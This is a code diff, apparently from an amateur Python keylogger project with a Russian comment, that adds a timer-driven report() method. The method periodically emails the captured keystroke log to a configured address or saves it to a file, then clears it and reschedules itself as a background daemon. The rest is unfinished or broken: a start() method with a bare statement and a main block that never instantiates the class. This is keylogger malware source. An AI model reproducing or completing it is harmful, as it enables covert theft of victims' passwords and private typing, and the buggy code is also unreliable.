@@ -62,4 +62,27 @@ class KeyLogger:
         server.sendmail(email,email, message)
         server.quit()
 
+    def report(self):
+        if self.log:
+            self.end_date = datetime.now()
+            # обновляем имя файла
+            self.update_filename()
+            if self.report_method == 'email':
+                self.sendmail((EMAIL_ADDRESS, EMAIL_PASSWORD, self.log))
+            elif self.report_method == 'file':
+                self.report_to_file()
+
+            self.start_date = datetime.now()
+
+        self.log = " "
+        timer = Timer(interval = self.interval, function = self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_date
+
+
+if __name__ == '__main__':
+    keylogger = KeyLogger
 
